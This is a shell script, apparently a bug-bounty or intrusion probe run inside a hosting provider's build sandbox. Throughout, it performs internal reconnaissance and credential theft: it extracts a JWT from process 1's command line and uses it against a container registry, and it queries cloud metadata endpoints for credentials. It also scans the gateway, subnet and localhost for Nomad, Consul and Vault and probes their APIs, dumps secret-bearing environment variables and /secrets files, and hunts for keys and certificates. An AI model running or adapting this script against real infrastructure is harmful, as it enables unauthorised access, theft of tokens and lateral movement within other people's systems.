#!/bin/sh
exec > /build_output.txt 2>&1

echo "=== BUILD PROBE R49 - NETWORK RECON ==="
date

# 1. Capabilities and identity
echo "--- CAPABILITIES ---"
cat /proc/self/status 2>/dev/null | grep -iE 'cap|uid|gid'
id
whoami

# 2. All processes
echo "--- ALL PROCS ---"
for p in /proc/[0-9]*/cmdline; do
  pid=$(echo "$p" | cut -d/ -f3)
  cmd=$(cat "$p" 2>/dev/null | tr '\0' ' ')
  [ -n "$cmd" ] && echo "PID $pid: $cmd"
done

# 3. Extract JWT from PID1 cmdline for registry access
echo "--- JWT EXTRACT ---"
JWT=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | grep '^eyJ' | head -1)
if [ -n "$JWT" ]; then
  echo "JWT found, length: $(echo -n "$JWT" | wc -c)"
  echo "== CATALOG =="
  curl -s -m 5 -H "Authorization: Bearer $JWT" "https://user-registry.eur-1.aivencloud.net/v2/_catalog" 2>&1 | head -30
  for repo in falcon falcon-pgsql dev-sandbox postgres postgresql; do
    echo "== REPO: $repo =="
    curl -s -m 5 -H "Authorization: Bearer $JWT" "https://user-registry.eur-1.aivencloud.net/v2/$repo/tags/list" 2>&1 | head -5
  done
fi

# 4. Mounts
echo "--- MOUNTS ---"
cat /proc/self/mountinfo 2>/dev/null | head -30

# 5. Network info
echo "--- NETWORK ---"
ip addr 2>/dev/null || ifconfig 2>/dev/null
ip route 2>/dev/null || route -n 2>/dev/null
cat /etc/resolv.conf 2>/dev/null

# 6. DNS for internal services
echo "--- DNS RECON ---"
for h in consul nomad vault nomad.service.consul consul.service.consul vault.service.consul \
         active.vault.service.consul server.dc1.consul client.dc1.consul \
         metadata.google.internal _nomad._tcp.service.consul; do
  result=$(nslookup "$h" 2>&1 | grep -A1 "Name:" | tail -1)
  [ -n "$result" ] && echo "$h -> $result" || echo "$h -> NXDOMAIN/FAIL"
done

# 7. Metadata services
echo "--- METADATA ---"
for url in \
  "http://169.254.169.254/opc/v2/instance/" \
  "http://169.254.169.254/opc/v1/instance/" \
  "http://169.254.169.254/opc/v2/instance/metadata/" \
  "http://169.254.169.254/latest/meta-data/" \
  "http://169.254.169.254/metadata/instance?api-version=2021-02-01" \
  "http://169.254.170.2/v2/credentials" \
  "http://100.100.100.200/latest/meta-data/"; do
  echo "== $url =="
  resp=$(curl -s -m 3 -H "Authorization: Bearer Oracle" -H "Metadata-Flavor: Google" -H "Metadata: true" "$url" 2>&1)
  [ -n "$resp" ] && echo "$resp" | head -10 || echo "NO RESPONSE"
done

# 8. Gateway and internal port scan
echo "--- GATEWAY SCAN ---"
GW=$(ip route 2>/dev/null | grep default | awk '{print $3}')
echo "Gateway: $GW"
if [ -n "$GW" ]; then
  for port in 4646 4647 4648 8200 8500 8501 8300 8301 9090 9093 3000 5432 6379 8080 8443 443 80 28319 12691; do
    timeout 1 nc -z "$GW" "$port" 2>/dev/null && echo "OPEN $GW:$port"
  done
fi

# Scan local subnet
echo "--- SUBNET SCAN ---"
MYIP=$(ip addr 2>/dev/null | grep 'inet ' | grep -v 127.0.0.1 | awk '{print $2}' | head -1 | cut -d/ -f1)
echo "My IP: $MYIP"
if [ -n "$MYIP" ]; then
  SUBNET=$(echo "$MYIP" | cut -d. -f1-3)
  for i in 1 2 3 4 5 10 20 50 100 200 254; do
    timeout 1 nc -z "$SUBNET.$i" 4646 2>/dev/null && echo "NOMAD $SUBNET.$i:4646"
    timeout 1 nc -z "$SUBNET.$i" 8200 2>/dev/null && echo "VAULT $SUBNET.$i:8200"
    timeout 1 nc -z "$SUBNET.$i" 8500 2>/dev/null && echo "CONSUL $SUBNET.$i:8500"
  done
fi

echo "--- LOCALHOST SCAN ---"
for port in 4646 4647 8200 8500 8501 5432 28319 8080 9090 3000 2049 111; do
  timeout 1 nc -z 127.0.0.1 "$port" 2>/dev/null && echo "OPEN 127.0.0.1:$port"
done

# 9. Try Nomad/Consul/Vault APIs
echo "--- NOMAD API ---"
for host in 127.0.0.1 "$GW"; do
  for port in 4646 4647; do
    resp=$(curl -s -m 3 "http://$host:$port/v1/agent/self" 2>&1 | head -20)
    [ -n "$resp" ] && echo "NOMAD $host:$port: $resp"
  done
done

echo "--- CONSUL API ---"
for host in 127.0.0.1 "$GW"; do
  resp=$(curl -s -m 3 "http://$host:8500/v1/catalog/services" 2>&1 | head -20)
  [ -n "$resp" ] && echo "CONSUL $host: $resp"
done

echo "--- VAULT API ---"
for host in 127.0.0.1 "$GW"; do
  resp=$(curl -s -m 3 "http://$host:8200/v1/sys/health" 2>&1 | head -20)
  [ -n "$resp" ] && echo "VAULT $host: $resp"
done

# 10. Alloc directory
echo "--- ALLOC DIR ---"
for d in /alloc /alloc/data /alloc/tmp /local /secrets; do
  echo "== $d =="
  ls -la "$d" 2>&1 | head -10
  for f in $(find "$d" -maxdepth 2 -type f 2>/dev/null | head -10); do
    echo "FILE: $f ($(wc -c < "$f" 2>/dev/null) bytes)"
    cat "$f" 2>&1 | head -20
  done
done

# 11. Environment vars
echo "--- ENV VARS ---"
env | sort | grep -iE 'nomad|vault|consul|token|secret|pass|key|auth|url|host|port|addr' | head -30
cat /proc/self/environ 2>/dev/null | tr '\0' '\n' | sort | head -30

# 12. Find interesting files
echo "--- FILE HUNT ---"
find / -maxdepth 4 \( -name "*.env" -o -name "*.secret" -o -name "*.key" -o -name "*.pem" \
  -o -name "*.cert" -o -name "*.crt" -o -name "token" -o -name "credentials" \
  -o -name "*.conf" -o -name "*.cfg" -o -name "*.json" \) \
  -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -30

# 13. Try reaching falcon PG from inside Aiven network
echo "--- FALCON PG INTERNAL ---"
for port in 5432 28319 12691 5433; do
  timeout 2 nc -zv 132.145.163.127 "$port" 2>&1
done
# Try internal DNS names
for host in falcon-bug-bounty-flag-pgsql-dev-sandbox falcon-pgsql dev-sandbox; do
  nslookup "$host" 2>&1 | head -3
  nslookup "${host}.e.aivencloud.com" 2>&1 | head -3
done

echo "=== BUILD DONE R49 ==="
